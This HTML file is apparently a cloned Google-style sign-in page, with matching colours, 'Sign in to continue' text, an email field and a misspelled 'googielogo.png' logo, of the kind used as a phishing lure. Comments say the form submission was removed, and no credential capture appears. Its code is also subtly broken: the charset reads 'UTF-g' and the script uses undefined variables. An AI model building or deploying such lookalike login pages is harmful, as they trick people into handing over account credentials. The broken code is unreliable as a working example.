<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-g">
    <meta content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <!-- Removed remote Google Fonts link -->
    <style>
        /* Apply Roboto font globally */
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #fff;
            color: #202124;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 1rem;
            margin: 0;
            box-sizing: border-box;
        }

        /* Main Login Card */
        .login-card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 448px;
            box-sizing: border-box;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }
        .header img {
            width: 40px;
            height: 40px;
            margin: 0 auto;
            display: block;
        }
        .header h1 {
            font-size: 1.5rem; /* 24px */
            margin-top: 1rem;
            font-weight: 400;
        }
        .header p {
            font-size: 1rem; /* 16px */
            margin-top: 0.75rem;
            line-height: 1.5;
        }
        
        /* Utility */
        .hidden {
            display: none;
        }
        
        /* Form Inputs (from original) */
        .form-input-container {
            position: relative;
            margin-bottom: 0.5rem;
        }
        .form-input {
            width: 100%;
            padding: 1.25rem 1rem; /* Equivalent to py-5 px-4 */
            border: 1px solid #dadce0;
            border-radius: 4px;
            height: 3.5rem; /* 56px */
            box-sizing: border-box;
            font-size: 1rem;
            peer: true; /* This doesn't do anything in CSS, but shows intent */
        }
        .form-input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
            outline: none;
        }
        .form-label {
            position: absolute;
            top: 1.35rem;
            left: 1rem;
            color: #5f6368;
            pointer-events: none;
            transition: all 0.2s ease-out;
            transform-origin: left top;
            background-color: #fff;
            padding: 0 0.25rem;
        }
        .form-input:focus + .form-label,
        .form-input:not(:placeholder-shown) + .form-label {
            transform: translateY(-0.95rem) scale(0.75);
            color: #1a73e8;
            left: 0.75rem;
            top: 0.5rem; /* Adjust to sit on top of the border */
        }
        .form-input:not(:placeholder-shown):not(:focus) + .form-label {
             color: #5f6368;
        }
        .form-input::placeholder {
            color: transparent;
        }

        /* Buttons */
        .btn {
            font-size: 0.875rem; /* 14px */
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.2s ease-in-out;
            box-sizing: border-box;
            border: none;
        }

        .btn-link {
            color: #1a73e8;
            background-color: transparent;
            padding: 0.5rem;
            margin: -0.5rem; /* For larger click area */
        }
        .btn-link:hover {
            background-color: #f8fafe;
        }

        .btn-secondary {
            color: #1a73e8;
            background-color: transparent;
            padding: 0.75rem 0.5rem; /* py-3 px-2 */
            margin-left: -0.75rem;
        }
        .btn-secondary:hover {
            background-color: #f8fafe;
        }

        .btn-primary {
            background-color: #1a73e8;
            color: white;
            padding: 0.75rem 1.5rem; /* py-3 px-6 */
        }
        .btn-primary:hover {
            background-color: #1b66c9;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.1);
        }
        .btn-primary:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.3);
        }

        /* Button Layout */
        .actions-container {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            margin-top: 2rem;
        }
        .actions-container .btn-secondary {
            order: 2;
            margin-top: 1rem;
            width: auto;
        }
        .actions-container .btn-primary {
            order: 1;
            width: 100%;
        }

        /* Responsive layout for buttons */
        @media (min-width: 640px) {
            .actions-container {
                flex-direction: row;
            }
            .actions-container .btn-secondary {
                order: 1;
                margin-top: 0;
            }
            .actions-container .btn-primary {
                order: 2;
                width: auto;
            }
        }

        /* Password Step Specifics */
        .header-pill-container {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
            position: relative;
        }
        #back-btn {
            position: absolute;
            left: -0.5rem;
            top: 50%;
            transform: translateY(-50%);
            padding: 0.5rem;
            border-radius: 50%;
            border: none;
            background: none;
            cursor: pointer;
        }
        #back-btn:hover {
            background-color: #f1f3f4;
        }
        #back-btn svg {
            width: 1.25rem;
            height: 1.25rem;
            color: #5f6368;
            display: block;
        }
        .email-display-container {
            flex-grow: 1;
            text-align: center;
        }
        #email-display {
            font-size: 0.875rem;
            font-weight: 500;
            border: 1px solid #dadce0;
            border-radius: 9999px;
            padding: 0.5rem 1rem;
        }
        #password-step .form-input-container {
            margin-top: 1.5rem;
        }
        
        .checkbox-container {
            margin-top: 1rem;
            display: flex;
            align-items: center;
            font-size: 0.875rem;
            cursor: pointer;
        }
        .checkbox-container input {
            margin-right: 0.5rem;
            height: 1rem;
            width: 1rem;
            accent-color: #1a73e8;
        }
        
        .actions-container-end {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 2rem;
        }
        .actions-container-end .btn-primary {
            width: 100%;
        }
        @media (min-width: 640px) {
            .actions-container-end .btn-primary {
                width: auto;
            }
        }

        /* Footer */
        .footer {
            position: absolute;
            bottom: 1rem;
            width: 100%;
            max-width: 448px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.75rem;
            color: #5f6368;
            box-sizing: border-box;
            padding: 0 1rem;
        }
        .footer select {
            background: transparent;
            border: none;
            padding: 0.5rem;
            border-radius: 4px;
            font-size: 0.75rem;
        }
        .footer select:focus {
            outline: 1px solid #999;
        }
        .footer-links {
            display: flex;
            gap: 1.5rem;
        }
        .footer-links a {
            text-decoration: none;
            color: inherit;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Success Message */
        .success-message {
            text-align: center;
            padding: 2rem;
        }
        .success-message h1 {
            font-size: 1.5rem;
            font-weight: 500;
            color: #16a34a;
            margin-bottom: 1rem;
        }
        .success-message p {
            color: #374151;
        }
        .success-message .p-small {
            font-size: 0.875rem;
            color: #6b7280;
            margin-top: 0.5rem;
        }

    </style>
</head>
<body class="bg-white text-[#202124] flex items-center justify-center min-h-screen p-4">

    <!-- Main Login Card -->
    <div class="login-card">
        
        <!-- Header: Google Logo and Title (Shared) -->
        <header class="header">
            <img src="googielogo.png" width="40" height="40" alt="Logo">
            <h1 id="main-title">Sign in</h1>
            <p id="main-subtitle">to continue</p>
        </header>

        <!-- Form Area -->
        <main id="main-content">
            <!-- Removed method="post" to prevent any submission attempt -->
            <form id="login-form">
                
                <!-- ====== STEP 1: EMAIL ====== -->
                <div id="email-step">
                    <!-- Email or phone input -->
                    <div class="form-input-container">
                        <input 
                            type="email" 
                            id="email" 
                            class="form-input"
                            placeholder="Email or phone" 
                            aria-label="Email or phone"
                            autofocus
                        >
                        <label for="email" class="form-label">Email or phone</label>
                    </div>
                    
                    <!-- Forgot email link -->
                    <div>
                        <button type="button" class="btn btn-link">
                            Forgot email?
                        </button>
                    </div>

                    <!-- Action Buttons -->
                    <div class="actions-container">
                        <!-- Create account button -->
                        <button type="button" class="btn btn-secondary">
                            Create account
                        </button>
                        
                        <!-- Next button (triggers JS) -->
                        <a id="next-btn" type="button" class="btn btn-primary" href="password.html">
                            Next 
                        </a>
                    </div>
                </div>
            </form>
        </main>
    </div>
    
    <!-- Footer (unchanged) -->
    <footer class="footer">
        <select aria-label="Change language">
            <option value="en-US">English (United States)</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
            <option value="de">Deutsch</option>
            <!-- Add more languages as needed -->
        </select>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>

    <!-- JavaScript for multi-step logic (unchanged) -->
    <script>
        // Get all the elements we need
        const emailStep = document.getElementById('email-step');
        
        const emailInput = document.getElementById('email');
        
        const nextToPasswordBtn = document.getElementById('next-btn');

        const mainTitle = document.getElementById('main-title');
        const mainSubtitle = document.getElementById('main-subtitle');

        // 1. Go from Email -> Password
        nextToPasswordBtn.addEventListener('click', () => {
            const email = emailInput.value;
            // Basic validation: just check if it's not empty
            if (email) {
                emailDisplay.textContent = email; // Update the pill
                
                emailStep.classList.add('hidden');
                passwordStep.classList.remove('hidden');
                
                // Update header text
                mainTitle.textContent = 'Welcome';
                mainSubtitle.classList.add('hidden'); // Hide subtitle

                passwordInput.focus(); // Focus password field
            } else {
                // Optional: Add error handling (e.g., shake, red border)
                emailInput.focus();
            }
        });
    </script>

</body>
</html>
